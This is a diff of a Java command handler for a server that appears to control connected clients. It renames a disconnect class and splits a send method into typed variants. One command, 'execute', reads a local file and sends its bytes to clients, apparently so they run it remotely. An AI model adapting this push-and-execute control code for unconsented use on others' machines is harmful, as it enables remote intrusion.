@@ -2,7 +2,7 @@ package me.soda.witch.server.server;
 
 import com.google.gson.Gson;
 import me.soda.witch.server.Main;
-import me.soda.witch.shared.socket.messages.messages.DisconnectInfo;
+import me.soda.witch.shared.socket.messages.messages.DisconnectData;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -17,7 +17,6 @@ public class CommandHandler {
                 switch (msgArr[0]) {
                     case "stop" -> {
                         server.stop();
-                        server.stopped = true;
                         Main.inputStream.close();
                     }
                     case "conn" -> {
@@ -52,13 +51,13 @@ public class CommandHandler {
                                 case "disconnect" -> {
                                     server.getConnections().stream().filter(conn ->
                                                     server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
-                                            .forEach(connection -> connection.close(DisconnectInfo.Reason.NO_RECONNECT));
+                                            .forEach(connection -> connection.close(DisconnectData.Reason.NO_RECONNECT));
                                     Server.log("Client " + msgArr[2] + " disconnected");
                                 }
                                 case "reconnect" -> {
                                     server.getConnections().stream().filter(conn ->
                                                     server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
-                                            .forEach(connection -> connection.close(DisconnectInfo.Reason.RECONNECT));
+                                            .forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT));
                                     Server.log("Client " + msgArr[2] + " reconnecting");
                                 }
                                 default -> {
@@ -72,13 +71,13 @@ public class CommandHandler {
                             if (msgArr[0].equals("execute")) {
                                 File file = new File(command);
                                 try (FileInputStream is = new FileInputStream(file)) {
-                                    server.sendUtil.trySend(server, msgArr[0], is.readAllBytes());
+                                    server.sendUtil.trySendBytes(server, msgArr[0], is.readAllBytes());
                                 }
                             } else {
-                                server.sendUtil.trySend(server, msgArr[0], command);
+                                server.sendUtil.trySendJson(server, msgArr[0], command);
                             }
                         } else {
-                            server.sendUtil.trySend(server, msgArr[0], null);
+                            server.sendUtil.trySendString(server, msgArr[0]);
                         }
                     }
                 }
